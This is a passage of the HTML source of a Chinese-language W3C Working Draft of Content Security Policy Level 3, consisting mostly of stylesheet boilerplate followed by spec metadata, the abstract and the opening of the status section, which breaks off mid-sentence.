<!doctype html>
<html lang="zh-hans">

<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta content="width=device-width, initial-scale=1, shrink-to-fit=no" name="viewport">
    <title>内容安全策略第 3 级</title>
    <meta content="WD" name="w3c-status">
    <link href="https://www.w3.org/StyleSheets/TR/2021/W3C-WD" rel="stylesheet">
    <meta content="Bikeshed version b25686b9f, updated Fri Mar 14 14:15:20 2025 -0700" name="generator">
    <link href="https://www.w3.org/TR/CSP3/" rel="canonical">
    <meta content="205cac6ee7805e30b7ec98c344bf5e9d67ce717d" name="revision">
    <meta content="dark light" name="color-scheme">
    <style>
        ul.toc ul ul ul {
            margin: 0 0 0 2em;
        }

        ul.toc ul ul ul span.secno {
            margin-left: -9em;
        }

        a[href^="http:"]:after {
            color: red;
            content: "\1F512";
            /* A lock symbol: 🔓. */
        }

        .wip {
            margin: 1em auto;

            background: #FCFAEE;
            border: 0.5em;
            border-left-style: solid;
            border-color: #E0CB52;
            padding: 0.5em;
        }

        .wip::before {
            content: "Work In Progress: ";
            display: block;
            color: #827017;
        }

        section.wip {
            padding-left: 2em;
        }
    </style>
    <style>
        /* Boilerplate: style-autolinks */
        .css.css,
        .property.property,
        .descriptor.descriptor {
            color: var(--a-normal-text);
            font-size: inherit;
            font-family: inherit;
        }

        .css::before,
        .property::before,
        .descriptor::before {
            content: "‘";
        }

        .css::after,
        .property::after,
        .descriptor::after {
            content: "’";
        }

        .property,
        .descriptor {
            /* Don't wrap property and descriptor names */
            white-space: nowrap;
        }

        .type {
            /* CSS value <type> */
            font-style: italic;
        }

        pre .property::before,
        pre .property::after {
            content: "";
        }

        [data-link-type="property"]::before,
        [data-link-type="propdesc"]::before,
        [data-link-type="descriptor"]::before,
        [data-link-type="value"]::before,
        [data-link-type="function"]::before,
        [data-link-type="at-rule"]::before,
        [data-link-type="selector"]::before,
        [data-link-type="maybe"]::before {
            content: "‘";
        }

        [data-link-type="property"]::after,
        [data-link-type="propdesc"]::after,
        [data-link-type="descriptor"]::after,
        [data-link-type="value"]::after,
        [data-link-type="function"]::after,
        [data-link-type="at-rule"]::after,
        [data-link-type="selector"]::after,
        [data-link-type="maybe"]::after {
            content: "’";
        }

        [data-link-type].production::before,
        [data-link-type].production::after,
        .prod [data-link-type]::before,
        .prod [data-link-type]::after {
            content: "";
        }

        [data-link-type=element],
        [data-link-type=element-attr] {
            font-family: Menlo, Consolas, "DejaVu Sans Mono", monospace;
            font-size: .9em;
        }

        [data-link-type=element]::before {
            content: "<"
        }

        [data-link-type=element]::after {
            content: ">"
        }

        [data-link-type=biblio] {
            white-space: pre;
        }

        @media (prefers-color-scheme: dark) {
            :root {
                --selflink-text: black;
                --selflink-bg: silver;
                --selflink-hover-text: white;
            }
        }
    </style>
    <style>
        /* Boilerplate: style-colors */
        /* Any --*-text not paired with a --*-bg is assumed to have a transparent bg */
        :root {
            color-scheme: light dark;

            --text: black;
            --bg: white;

            --unofficial-watermark: url(https://www.w3.org/StyleSheets/TR/2016/logos/UD-watermark);

            --logo-bg: #1a5e9a;
            --logo-active-bg: #c00;
            --logo-text: white;

            --tocnav-normal-text: #707070;
            --tocnav-normal-bg: var(--bg);
            --tocnav-hover-text: var(--tocnav-normal-text);
            --tocnav-hover-bg: #f8f8f8;
            --tocnav-active-text: #c00;
            --tocnav-active-bg: var(--tocnav-normal-bg);

            --tocsidebar-text: var(--text);
            --tocsidebar-bg: #f7f8f9;
            --tocsidebar-shadow: rgba(0, 0, 0, .1);
            --tocsidebar-heading-text: hsla(203, 20%, 40%, .7);

            --toclink-text: var(--text);
            --toclink-underline: #3980b5;
            --toclink-visited-text: var(--toclink-text);
            --toclink-visited-underline: #054572;

            --heading-text: #005a9c;

            --hr-text: var(--text);

            --algo-border: #def;

            --del-text: red;
            --del-bg: transparent;
            --ins-text: #080;
            --ins-bg: transparent;

            --a-normal-text: #034575;
            --a-normal-underline: #bbb;
            --a-visited-text: var(--a-normal-text);
            --a-visited-underline: #707070;
            --a-hover-bg: rgba(75%, 75%, 75%, .25);
            --a-active-text: #c00;
            --a-active-underline: #c00;

            --blockquote-border: silver;
            --blockquote-bg: transparent;
            --blockquote-text: currentcolor;

            --issue-border: #e05252;
            --issue-bg: #fbe9e9;
            --issue-text: var(--text);
            --issueheading-text: #831616;

            --example-border: #e0cb52;
            --example-bg: #fcfaee;
            --example-text: var(--text);
            --exampleheading-text: #574b0f;

            --note-border: #52e052;
            --note-bg: #e9fbe9;
            --note-text: var(--text);
            --noteheading-text: hsl(120, 70%, 30%);
            --notesummary-underline: silver;

            --assertion-border: #aaa;
            --assertion-bg: #eee;
            --assertion-text: black;

            --advisement-border: orange;
            --advisement-bg: #fec;
            --advisement-text: var(--text);
            --advisementheading-text: #b35f00;

            --warning-border: red;
            --warning-bg: hsla(40, 100%, 50%, 0.95);
            --warning-text: var(--text);

            --amendment-border: #330099;
            --amendment-bg: #F5F0FF;
            --amendment-text: var(--text);
            --amendmentheading-text: #220066;

            --def-border: #8ccbf2;
            --def-bg: #def;
            --def-text: var(--text);
            --defrow-border: #bbd7e9;

            --datacell-border: silver;

            --indexinfo-text: #707070;

            --indextable-hover-text: black;
            --indextable-hover-bg: #f7f8f9;

            --outdatedspec-bg: rgba(0, 0, 0, .5);
            --outdatedspec-text: black;
            --outdated-bg: maroon;
            --outdated-text: white;
            --outdated-shadow: red;

            --editedrec-bg: darkorange;
        }

        @media (prefers-color-scheme: dark) {
            :root {
                --text: #ddd;
                --bg: black;

                --unofficial-watermark: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='400' height='400'%3E%3Cg fill='%23100808' transform='translate(200 200) rotate(-45) translate(-200 -200)' stroke='%23100808' stroke-width='3'%3E%3Ctext x='50%25' y='220' style='font: bold 70px sans-serif; text-anchor: middle; letter-spacing: 6px;'%3EUNOFFICIAL%3C/text%3E%3Ctext x='50%25' y='305' style='font: bold 70px sans-serif; text-anchor: middle; letter-spacing: 6px;'%3EDRAFT%3C/text%3E%3C/g%3E%3C/svg%3E");

                --logo-bg: #1a5e9a;
                --logo-active-bg: #c00;
                --logo-text: white;

                --tocnav-normal-text: #999;
                --tocnav-normal-bg: var(--bg);
                --tocnav-hover-text: var(--tocnav-normal-text);
                --tocnav-hover-bg: #080808;
                --tocnav-active-text: #f44;
                --tocnav-active-bg: var(--tocnav-normal-bg);

                --tocsidebar-text: var(--text);
                --tocsidebar-bg: #080808;
                --tocsidebar-shadow: rgba(255, 255, 255, .1);
                --tocsidebar-heading-text: hsla(203, 20%, 40%, .7);

                --toclink-text: var(--text);
                --toclink-underline: #6af;
                --toclink-visited-text: var(--toclink-text);
                --toclink-visited-underline: #054572;

                --heading-text: #8af;

                --hr-text: var(--text);

                --algo-border: #456;

                --del-text: #f44;
                --del-bg: transparent;
                --ins-text: #4a4;
                --ins-bg: transparent;

                --a-normal-text: #6af;
                --a-normal-underline: #555;
                --a-visited-text: var(--a-normal-text);
                --a-visited-underline: var(--a-normal-underline);
                --a-hover-bg: rgba(25%, 25%, 25%, .2);
                --a-active-text: #f44;
                --a-active-underline: var(--a-active-text);

                --borderedblock-bg: rgba(255, 255, 255, .05);

                --blockquote-border: silver;
                --blockquote-bg: var(--borderedblock-bg);
                --blockquote-text: currentcolor;

                --issue-border: #e05252;
                --issue-bg: var(--borderedblock-bg);
                --issue-text: var(--text);
                --issueheading-text: hsl(0deg, 70%, 70%);

                --example-border: hsl(50deg, 90%, 60%);
                --example-bg: var(--borderedblock-bg);
                --example-text: var(--text);
                --exampleheading-text: hsl(50deg, 70%, 70%);

                --note-border: hsl(120deg, 100%, 35%);
                --note-bg: var(--borderedblock-bg);
                --note-text: var(--text);
                --noteheading-text: hsl(120, 70%, 70%);
                --notesummary-underline: silver;

                --assertion-border: #444;
                --assertion-bg: var(--borderedblock-bg);
                --assertion-text: var(--text);

                --advisement-border: orange;
                --advisement-bg: #222218;
                --advisement-text: var(--text);
                --advisementheading-text: #f84;

                --warning-border: red;
                --warning-bg: hsla(40, 100%, 20%, 0.95);
                --warning-text: var(--text);

                --amendment-border: #330099;
                --amendment-bg: #080010;
                --amendment-text: var(--text);
                --amendmentheading-text: #cc00ff;

                --def-border: #8ccbf2;
                --def-bg: #080818;
                --def-text: var(--text);
                --defrow-border: #136;

                --datacell-border: silver;

                --indexinfo-text: #aaa;

                --indextable-hover-text: var(--text);
                --indextable-hover-bg: #181818;

                --outdatedspec-bg: rgba(255, 255, 255, .5);
                --outdatedspec-text: black;
                --outdated-bg: maroon;
                --outdated-text: white;
                --outdated-shadow: red;

                --editedrec-bg: darkorange;
            }

            /* In case a transparent-bg image doesn't expect to be on a dark bg,
       which is quite common in practice... */
            img {
                background: white;
            }
        }
    </style>
    <style>
        /* Boilerplate: style-counters */
        body {
            counter-reset: example figure issue;
        }

        .issue {
            counter-increment: issue;
        }

        .issue:not(.no-marker)::before {
            content: "Issue " counter(issue);
        }

        .example {
            counter-increment: example;
        }

        .example:not(.no-marker)::before {
            content: "Example " counter(example);
        }

        .invalid.example:not(.no-marker)::before,
        .illegal.example:not(.no-marker)::before {
            content: "Invalid Example" counter(example);
        }

        figcaption {
            counter-increment: figure;
        }

        figcaption:not(.no-marker)::before {
            content: "Figure " counter(figure) " ";
        }
    </style>
    <style>
        /* Boilerplate: style-dfn-panel */
        :root {
            --dfnpanel-bg: #ddd;
            --dfnpanel-text: var(--text);
            --dfnpanel-target-bg: #ffc;
            --dfnpanel-target-outline: orange;
        }

        @media (prefers-color-scheme: dark) {
            :root {
                --dfnpanel-bg: #222;
                --dfnpanel-text: var(--text);
                --dfnpanel-target-bg: #333;
                --dfnpanel-target-outline: silver;
            }
        }

        .dfn-panel {
            position: absolute;
            z-index: 35;
            width: 20em;
            width: 300px;
            height: auto;
            max-height: 500px;
            overflow: auto;
            padding: 0.5em 0.75em;
            font: small Helvetica Neue, sans-serif, Droid Sans Fallback;
            background: var(--dfnpanel-bg);
            color: var(--dfnpanel-text);
            border: outset 0.2em;
            white-space: normal;
            /* in case it's moved into a pre */
        }

        .dfn-panel:not(.on) {
            display: none;
        }

        .dfn-panel * {
            margin: 0;
            padding: 0;
            text-indent: 0;
        }

        .dfn-panel>b {
            display: block;
        }

        .dfn-panel a {
            color: var(--dfnpanel-text);
        }

        .dfn-panel a:not(:hover) {
            text-decoration: none !important;
            border-bottom: none !important;
        }

        .dfn-panel a:focus {
            outline: 5px auto Highlight;
            outline: 5px auto -webkit-focus-ring-color;
        }

        .dfn-panel>b+b {
            margin-top: 0.25em;
        }

        .dfn-panel ul {
            padding: 0 0 0 1em;
            list-style: none;
        }

        .dfn-panel li a {
            max-width: calc(300px - 1.5em - 1em);
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .dfn-panel.activated {
            display: inline-block;
            position: fixed;
            left: 8px;
            bottom: 2em;
            margin: 0 auto;
            max-width: calc(100vw - 1.5em - .4em - .5em);
            max-height: 30vh;
            transition: left 1s ease-out, bottom 1s ease-out;
        }

        .dfn-panel .link-item:hover {
            text-decoration: underline;
        }

        .dfn-panel .link-item .copy-icon {
            opacity: 0;
        }

        .dfn-panel .link-item:hover .copy-icon,
        .dfn-panel .link-item .copy-icon:focus {
            opacity: 1;
        }

        .dfn-panel .copy-icon {
            display: inline-block;
            margin-right: 0.5em;
            width: 0.85em;
            height: 1em;
            border-radius: 3px;
            background-color: #ccc;
            cursor: pointer;
        }

        .dfn-panel .copy-icon .icon {
            width: 100%;
            height: 100%;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
        }

        .dfn-panel .copy-icon .icon::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: 1px solid black;
            background-color: #ccc;
            opacity: 0.25;
            transform: translate(3px, -3px);
        }

        .dfn-panel .copy-icon:active .icon::before {
            opacity: 1;
        }

        .dfn-paneled[role="button"] {
            cursor: help;
        }

        .highlighted {
            animation: target-fade 3s;
        }

        @keyframes target-fade {
            from {
                background-color: var(--dfnpanel-target-bg);
                outline: 5px solid var(--dfnpanel-target-outline);
            }

            to {
                color: var(--a-normal-text);
                background-color: transparent;
                outline: transparent;
            }
        }
    </style>
    <style>
        /* Boilerplate: style-idl-highlighting */
        pre.idl.highlight {
            background: var(--borderedblock-bg, var(--def-bg));
        }
    </style>
    <style>
        /* Boilerplate: style-issues */
        a[href].issue-return {
            float: right;
            float: inline-end;
            color: var(--issueheading-text);
            font-weight: bold;
            text-decoration: none;
        }
    </style>
    <style>
        /* Boilerplate: style-md-lists */
        /* This is a weird hack for me not yet following the commonmark spec
   regarding paragraph and lists. */
        [data-md]> :first-child {
            margin-top: 0;
        }

        [data-md]> :last-child {
            margin-bottom: 0;
        }
    </style>
    <style>
        /* Boilerplate: style-ref-hints */
        :root {
            --ref-hint-bg: #ddd;
            --ref-hint-text: var(--text);
        }

        @media (prefers-color-scheme: dark) {
            :root {
                --ref-hint-bg: #222;
                --ref-hint-text: var(--text);
            }
        }

        .ref-hint {
            display: inline-block;
            position: absolute;
            z-index: 35;
            width: 20em;
            width: 300px;
            height: auto;
            max-height: 500px;
            overflow: auto;
            padding: 0.5em 0.5em;
            font: small Helvetica Neue, sans-serif, Droid Sans Fallback;
            background: var(--ref-hint-bg);
            color: var(--ref-hint-text);
            border: outset 0.2em;
            white-space: normal;
            /* in case it's moved into a pre */
        }

        .ref-hint * {
            margin: 0;
            padding: 0;
            text-indent: 0;
        }

        .ref-hint ul {
            padding: 0 0 0 1em;
            list-style: none;
        }
    </style>
    <style>
        /* Boilerplate: style-selflinks */
        :root {
            --selflink-text: white;
            --selflink-bg: gray;
            --selflink-hover-text: black;
        }

        .heading,
        .issue,
        .note,
        .example,
        li,
        dt {
            position: relative;
        }

        a.self-link {
            position: absolute;
            top: 0;
            left: calc(-1 * (3.5rem - 26px));
            width: calc(3.5rem - 26px);
            height: 2em;
            text-align: center;
            border: none;
            transition: opacity .2s;
            opacity: .5;
        }

        a.self-link:hover {
            opacity: 1;
        }

        .heading>a.self-link {
            font-size: 83%;
        }

        .example>a.self-link,
        .note>a.self-link,
        .issue>a.self-link {
            /* These blocks are overflow:auto, so positioning outside
       doesn't work. */
            left: auto;
            right: 0;
        }

        li>a.self-link {
            left: calc(-1 * (3.5rem - 26px) - 2em);
        }

        dfn>a.self-link {
            top: auto;
            left: auto;
            opacity: 0;
            width: 1.5em;
            height: 1.5em;
            background: var(--selflink-bg);
            color: var(--selflink-text);
            font-style: normal;
            transition: opacity .2s, background-color .2s, color .2s;
        }

        dfn:hover>a.self-link {
            opacity: 1;
        }

        dfn>a.self-link:hover {
            color: var(--selflink-hover-text);
        }

        a.self-link::before {
            content: "¶";
        }

        .heading>a.self-link::before {
            content: "§";
        }

        dfn>a.self-link::before {
            content: "#";
        }
    </style>
    <style>
        /* Boilerplate: style-syntax-highlighting */
        code.highlight {
            padding: .1em;
            border-radius: .3em;
        }

        pre.highlight,
        pre>code.highlight {
            display: block;
            padding: 1em;
            margin: .5em 0;
            overflow: auto;
            border-radius: 0;
        }

        .highlight:not(.idl) {
            background: rgba(0, 0, 0, .03);
        }

        c-[a] {
            color: #990055
        }

        /* Keyword.Declaration */
        c-[b] {
            color: #990055
        }

        /* Keyword.Type */
        c-[c] {
            color: #708090
        }

        /* Comment */
        c-[d] {
            color: #708090
        }

        /* Comment.Multiline */
        c-[e] {
            color: #0077aa
        }

        /* Name.Attribute */
        c-[f] {
            color: #669900
        }

        /* Name.Tag */
        c-[g] {
            color: #222222
        }

        /* Name.Variable */
        c-[k] {
            color: #990055
        }

        /* Keyword */
        c-[l] {
            color: #000000
        }

        /* Literal */
        c-[m] {
            color: #000000
        }

        /* Literal.Number */
        c-[n] {
            color: #0077aa
        }

        /* Name */
        c-[o] {
            color: #999999
        }

        /* Operator */
        c-[p] {
            color: #999999
        }

        /* Punctuation */
        c-[s] {
            color: #a67f59
        }

        /* Literal.String */
        c-[t] {
            color: #a67f59
        }

        /* Literal.String.Single */
        c-[u] {
            color: #a67f59
        }

        /* Literal.String.Double */
        c-[cp] {
            color: #708090
        }

        /* Comment.Preproc */
        c-[c1] {
            color: #708090
        }

        /* Comment.Single */
        c-[cs] {
            color: #708090
        }

        /* Comment.Special */
        c-[kc] {
            color: #990055
        }

        /* Keyword.Constant */
        c-[kn] {
            color: #990055
        }

        /* Keyword.Namespace */
        c-[kp] {
            color: #990055
        }

        /* Keyword.Pseudo */
        c-[kr] {
            color: #990055
        }

        /* Keyword.Reserved */
        c-[ld] {
            color: #000000
        }

        /* Literal.Date */
        c-[nc] {
            color: #0077aa
        }

        /* Name.Class */
        c-[no] {
            color: #0077aa
        }

        /* Name.Constant */
        c-[nd] {
            color: #0077aa
        }

        /* Name.Decorator */
        c-[ni] {
            color: #0077aa
        }

        /* Name.Entity */
        c-[ne] {
            color: #0077aa
        }

        /* Name.Exception */
        c-[nf] {
            color: #0077aa
        }

        /* Name.Function */
        c-[nl] {
            color: #0077aa
        }

        /* Name.Label */
        c-[nn] {
            color: #0077aa
        }

        /* Name.Namespace */
        c-[py] {
            color: #0077aa
        }

        /* Name.Property */
        c-[ow] {
            color: #999999
        }

        /* Operator.Word */
        c-[mb] {
            color: #000000
        }

        /* Literal.Number.Bin */
        c-[mf] {
            color: #000000
        }

        /* Literal.Number.Float */
        c-[mh] {
            color: #000000
        }

        /* Literal.Number.Hex */
        c-[mi] {
            color: #000000
        }

        /* Literal.Number.Integer */
        c-[mo] {
            color: #000000
        }

        /* Literal.Number.Oct */
        c-[sb] {
            color: #a67f59
        }

        /* Literal.String.Backtick */
        c-[sc] {
            color: #a67f59
        }

        /* Literal.String.Char */
        c-[sd] {
            color: #a67f59
        }

        /* Literal.String.Doc */
        c-[se] {
            color: #a67f59
        }

        /* Literal.String.Escape */
        c-[sh] {
            color: #a67f59
        }

        /* Literal.String.Heredoc */
        c-[si] {
            color: #a67f59
        }

        /* Literal.String.Interpol */
        c-[sx] {
            color: #a67f59
        }

        /* Literal.String.Other */
        c-[sr] {
            color: #a67f59
        }

        /* Literal.String.Regex */
        c-[ss] {
            color: #a67f59
        }

        /* Literal.String.Symbol */
        c-[vc] {
            color: #0077aa
        }

        /* Name.Variable.Class */
        c-[vg] {
            color: #0077aa
        }

        /* Name.Variable.Global */
        c-[vi] {
            color: #0077aa
        }

        /* Name.Variable.Instance */
        c-[il] {
            color: #000000
        }

        /* Literal.Number.Integer.Long */

        @media (prefers-color-scheme: dark) {
            .highlight:not(.idl) {
                background: rgba(255, 255, 255, .05);
            }

            c-[a] {
                color: #d33682
            }

            /* Keyword.Declaration */
            c-[b] {
                color: #d33682
            }

            /* Keyword.Type */
            c-[c] {
                color: #2aa198
            }

            /* Comment */
            c-[d] {
                color: #2aa198
            }

            /* Comment.Multiline */
            c-[e] {
                color: #268bd2
            }

            /* Name.Attribute */
            c-[f] {
                color: #b58900
            }

            /* Name.Tag */
            c-[g] {
                color: #cb4b16
            }

            /* Name.Variable */
            c-[k] {
                color: #d33682
            }

            /* Keyword */
            c-[l] {
                color: #657b83
            }

            /* Literal */
            c-[m] {
                color: #657b83
            }

            /* Literal.Number */
            c-[n] {
                color: #268bd2
            }

            /* Name */
            c-[o] {
                color: #657b83
            }

            /* Operator */
            c-[p] {
                color: #657b83
            }

            /* Punctuation */
            c-[s] {
                color: #6c71c4
            }

            /* Literal.String */
            c-[t] {
                color: #6c71c4
            }

            /* Literal.String.Single */
            c-[u] {
                color: #6c71c4
            }

            /* Literal.String.Double */
            c-[ch] {
                color: #2aa198
            }

            /* Comment.Hashbang */
            c-[cp] {
                color: #2aa198
            }

            /* Comment.Preproc */
            c-[cpf] {
                color: #2aa198
            }

            /* Comment.PreprocFile */
            c-[c1] {
                color: #2aa198
            }

            /* Comment.Single */
            c-[cs] {
                color: #2aa198
            }

            /* Comment.Special */
            c-[kc] {
                color: #d33682
            }

            /* Keyword.Constant */
            c-[kn] {
                color: #d33682
            }

            /* Keyword.Namespace */
            c-[kp] {
                color: #d33682
            }

            /* Keyword.Pseudo */
            c-[kr] {
                color: #d33682
            }

            /* Keyword.Reserved */
            c-[ld] {
                color: #657b83
            }

            /* Literal.Date */
            c-[nc] {
                color: #268bd2
            }

            /* Name.Class */
            c-[no] {
                color: #268bd2
            }

            /* Name.Constant */
            c-[nd] {
                color: #268bd2
            }

            /* Name.Decorator */
            c-[ni] {
                color: #268bd2
            }

            /* Name.Entity */
            c-[ne] {
                color: #268bd2
            }

            /* Name.Exception */
            c-[nf] {
                color: #268bd2
            }

            /* Name.Function */
            c-[nl] {
                color: #268bd2
            }

            /* Name.Label */
            c-[nn] {
                color: #268bd2
            }

            /* Name.Namespace */
            c-[py] {
                color: #268bd2
            }

            /* Name.Property */
            c-[ow] {
                color: #657b83
            }

            /* Operator.Word */
            c-[mb] {
                color: #657b83
            }

            /* Literal.Number.Bin */
            c-[mf] {
                color: #657b83
            }

            /* Literal.Number.Float */
            c-[mh] {
                color: #657b83
            }

            /* Literal.Number.Hex */
            c-[mi] {
                color: #657b83
            }

            /* Literal.Number.Integer */
            c-[mo] {
                color: #657b83
            }

            /* Literal.Number.Oct */
            c-[sa] {
                color: #6c71c4
            }

            /* Literal.String.Affix */
            c-[sb] {
                color: #6c71c4
            }

            /* Literal.String.Backtick */
            c-[sc] {
                color: #6c71c4
            }

            /* Literal.String.Char */
            c-[dl] {
                color: #6c71c4
            }

            /* Literal.String.Delimiter */
            c-[sd] {
                color: #6c71c4
            }

            /* Literal.String.Doc */
            c-[se] {
                color: #6c71c4
            }

            /* Literal.String.Escape */
            c-[sh] {
                color: #6c71c4
            }

            /* Literal.String.Heredoc */
            c-[si] {
                color: #6c71c4
            }

            /* Literal.String.Interpol */
            c-[sx] {
                color: #6c71c4
            }

            /* Literal.String.Other */
            c-[sr] {
                color: #6c71c4
            }

            /* Literal.String.Regex */
            c-[ss] {
                color: #6c71c4
            }

            /* Literal.String.Symbol */
            c-[fm] {
                color: #268bd2
            }

            /* Name.Function.Magic */
            c-[vc] {
                color: #cb4b16
            }

            /* Name.Variable.Class */
            c-[vg] {
                color: #cb4b16
            }

            /* Name.Variable.Global */
            c-[vi] {
                color: #cb4b16
            }

            /* Name.Variable.Instance */
            c-[vm] {
                color: #cb4b16
            }

            /* Name.Variable.Magic */
            c-[il] {
                color: #657b83
            }

            /* Literal.Number.Integer.Long */
        }
    </style>
    <style>
        /* Boilerplate: style-var-click-highlighting */
        /*
Colors were chosen in Lab using https://nixsensor.com/free-color-converter/
D50 2deg illuminant, L in [0,100], a and b in [-128, 128]
0 = lab(85,0,85)
1 = lab(85,80,30)
2 = lab(85,-40,40)
3 = lab(85,-50,0)
4 = lab(85,5,15)
5 = lab(85,-10,-50)
6 = lab(85,35,-15)

For darkmode:
0 = oklab(50%   0%  108%)
1 = oklab(50% -51%   51%)
2 = oklab(50% -64%  -20%)
3 = oklab(50%   6%   19%)
4 = oklab(50% -12%  -64%)
5 = oklab(50%  44%  -19%)  
6 = oklab(50% 102%   38%)
*/

        [data-algorithm] var {
            cursor: pointer;
        }

        var[data-var-color] {
            background-color: var(--var-bg);
            box-shadow: 0 0 0 2px var(--var-bg);
        }

        var[data-var-color] {
            --var-bg: #F4D200;
        }

        var[data-var-color="1"] {
            --var-bg: #FF87A2;
        }

        var[data-var-color="2"] {
            --var-bg: #96E885;
        }

        var[data-var-color="3"] {
            --var-bg: #3EEED2;
        }

        var[data-var-color="4"] {
            --var-bg: #EACFB6;
        }

        var[data-var-color="5"] {
            --var-bg: #82DDFF;
        }

        var[data-var-color="6"] {
            --var-vg: #FFBCF2;
        }

        @media (prefers-color-scheme: dark) {
            var[data-var-color] {
                --var-bg: #bc1a00;
            }

            var[data-var-color="1"] {
                --var-bg: #007f00;
            }

            var[data-var-color="2"] {
                --var-bg: #008698;
            }

            var[data-var-color="3"] {
                --var-bg: #7f5b2b;
            }

            var[data-var-color="4"] {
                --var-bg: #004df3;
            }

            var[data-var-color="5"] {
                --var-bg: #a1248a;
            }

            var[data-var-color="6"] {
                --var-vg: #ff0000;
            }
        }
    </style>
    <link href="https://www.w3.org/StyleSheets/TR/2021/W3C-WD" rel="stylesheet">
    <link href="https://www.w3.org/StyleSheets/TR/2021/dark.css" media="(prefers-color-scheme: dark)" rel="stylesheet"
        type="text/css">

<body class="h-entry">
    <div class="head">
        <p data-fill-with="logo"><a class="logo" href="https://www.w3.org/"> <img alt="W3C" height="48"
                    src="https://www.w3.org/StyleSheets/TR/2021/logos/W3C" width="72"> </a> </p>
        <h1>内容安全策略第 3 级</h1>
        <p id="w3c-state"><a href="https://www.w3.org/standards/types/#WD">W3C 工作草案</a>, <time class="dt-updated"
                datetime="2025-04-30">2025年4月30日</time></p>
        <details open>
            <summary>关于此文档的更多详细信息</summary>
            <div data-fill-with="spec-metadata">
                <dl>
                    <dt>本版本：
                    </dt>
                    <dd><a class="u-url"
                            href="https://www.w3.org/TR/2025/WD-CSP3-20250430/">https://www.w3.org/TR/2025/WD-CSP3-20250430/</a>
                    </dd>
                    <dt>最新发布版本：
                    </dt>
                    <dd><a href="https://www.w3.org/TR/CSP3/">https://www.w3.org/TR/CSP3/</a>
                    </dd>
                    <dt>编辑草案：
                    </dt>
                    <dd><a href="https://w3c.github.io/webappsec-csp/">https://w3c.github.io/webappsec-csp/</a>
                    </dd>
                    <dt>先前版本：
                    </dt>
                    <dd><a href="https://www.w3.org/TR/2025/WD-CSP3-20250429/"
                            rel="prev">https://www.w3.org/TR/2025/WD-CSP3-20250429/</a>
                    </dd>
                    <dt>历史：
                    </dt>
                    <dd><a class="u-url"
                            href="https://www.w3.org/standards/history/CSP3/">https://www.w3.org/standards/history/CSP3/</a>
                    </dd>
                    <dt>反馈：
                    </dt>
                    <dd><span><a
                                href="mailto:public-webappsec@w3.org?subject=%5BCSP3%5D%20YOUR%20TOPIC%20HERE">public-webappsec@w3.org</a>
                            主题行：“<kbd>[CSP3] <i data-lt>… 消息主题 …</i></kbd>” (<a
                                href="https://lists.w3.org/Archives/Public/public-webappsec/"
                                rel="discussion">存档</a>)</span>
                    </dd>
                    <dd><a href="https://github.com/w3c/webappsec-csp/issues/new">Github</a>
                    </dd>
                    <dt class="editor">编辑：
                    </dt>
                    <dd class="editor p-author h-card vcard" data-editor-id="56384"><a class="p-name fn u-email email"
                            href="mailto:mkwst@google.com">Mike West</a> (<span class="p-org org">Google Inc.</span>)
                    </dd>
                    <dd class="editor p-author h-card vcard" data-editor-id="124875"><a class="p-name fn u-email email"
                            href="mailto:antoniosartori@google.com">Antonio Sartori</a> (<span class="p-org org">Google
                            Inc.</span>)
                    </dd>
                    <dt>参与：
                    </dt>
                    <dd><a href="https://github.com/w3c/webappsec-csp/issues/new">提交问题</a> (<a
                            href="https://github.com/w3c/webappsec-csp/issues">开放问题</a>)
                    </dd>
                    <dt>测试：
                        </dd>
                    <dd><a href="https://github.com/web-platform-tests/wpt/tree/master/content-security-policy">web-platform-tests
                            content-security-policy/</a> (<a
                            href="https://github.com/web-platform-tests/wpt/labels/content-security-policy">进行中的工作</a>)
                    </dd>
                </dl>
            </div>
        </details>
        <div data-fill-with="warning"></div>
        <p class="copyright" data-fill-with="copyright"><a href="https://www.w3.org/policies/#copyright">Copyright</a> ©
            2025 <a href="https://www.w3.org/">World Wide Web Consortium</a>. <abbr
                title="World Wide Web Consortium">W3C</abbr><sup>®</sup> <a
                href="https://www.w3.org/policies/#Legal_Disclaimer">liability</a>, <a
                href="https://www.w3.org/policies/#W3C_Trademarks">trademark</a> and <a
                href="https://www.w3.org/copyright/software-license/" rel="license"
                title="W3C Software and Document License">permissive document license</a> rules apply. </p>
        <hr title="标题分隔线">
    </div>
    <div class="p-summary" data-fill-with="abstract">
        <h2 class="no-num no-toc no-ref heading settled" id="abstract"><span class="content">摘要</span></h2>
        <p>本文件定义了一种机制，允许网页开发人员控制某个页面可以获取或执行的资源，以及若干安全相关的策略决策。</p>
    </div>
    <h2 class="no-num no-toc no-ref heading settled" id="sotd"><span class="content">本文档状态</span></h2>
    <div data-fill-with="status">
        <p> <em>本节描述了本文档在发布时的状态。W3C 当前发布的所有文档及此技术报告的最新版本可在 <a href="https://www.w3.org/TR/">W3C 技术报告索引
                    https://www.w3.org/TR/</a> 找到。</em> </p>
        <p> 本文档由<a href="https://www.w3.org/groups/wg/webappsec">Web 应用安全工作组</a> 作为工作草案发布，采用 <a
                href="https://www.w3.org/policies/process/20231103/#recs-and-notes">推荐路径</a>。该文档预计将成为 W3C 推荐标准。</p>
        <p> (<a href="https://lists.w3.org/Archives/Public/public-webappsec/">存档</a>) 的公共邮件列表 <a
                href="mailto:public-webappsec@w3.org?Subject=%5BCSP3%5D%20PUT%20SUBJECT%20HERE">public-webappsec@w3.org</a>
            （参见 <a href="https://www.w3.org/Mail/Request">说明</a>） 是讨论此规范的首选方式。
            发送电子邮件时，
            请在主题中包含“CSP3”字样，
            最好如下所示：
            “[CSP3] <em>…评论摘要…</em>” </p>
        <p> 发布工作草案并不意味着得到了 <abbr title="万维网联盟">W3C</abbr> 及其成员的支持。该文档是草案，可能会随时更新、替换或废止。作为非最终定稿引用此文档是不合适的。</p>
        <p> 本文档由 <a href="https://www.w3.org/groups/wg/webappsec">Web 应用安全工作组</a> 制作。</p>
        <p> 本文档由依照 <a href="https://www.w3.org/policies/patent-policy/">W3C 专利政策</a> 运营的工作组制作。
            W3C 维护了一个 <a href="https://www.w3.org/groups/wg/webappsec/ipr" rel="disclosure">任何与该组交付成果相关的专利披露公共列表</a>;
            该页面还包括披露专利的说明。
            如果个人知道专利，并认为其包含<a href="https://www.w3.org/policies/patent-policy/#def-essential">必要声明</a>，
